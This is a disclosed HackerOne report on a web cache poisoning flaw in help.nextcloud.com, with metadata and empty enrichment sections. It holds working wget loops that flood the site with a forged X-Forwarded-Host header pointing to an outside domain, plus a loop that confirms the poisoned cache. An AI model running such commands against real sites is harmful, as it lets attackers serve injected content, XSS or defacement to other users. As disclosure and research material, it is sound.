---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '429747'
original_report_id: '429747'
title: 'https://help.nextcloud.com::: Web cache poisoning attack'
team_handle: nextcloud
created_at: '2018-10-27T19:33:02.896Z'
disclosed_at: '2020-01-31T19:08:52.345Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 22
asset_identifier: help.nextcloud.com
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# https://help.nextcloud.com::: Web cache poisoning attack

## Metadata

- HackerOne Report ID: 429747
- Weakness: 
- Program: nextcloud
- Disclosed At: 2020-01-31T19:08:52.345Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi there,
I just found the website:
https://help.nextcloud.com
is infected with "Web cache poisoning"
Abuse this bug, Attacker can:
1. Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
2. Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)

How to reproduce the issue:

    In the 1st terminal, run command likes this: 
$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
    In the 2nd terminal, run command below for confirmation this attack is successful: 
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done

Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
Please see the attached image for details.

Impact
Stored XSS attack, deface website ....
Cheers,
~g4mm4

## Impact

Stored XSS attack, deface website, phishing for funs :)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
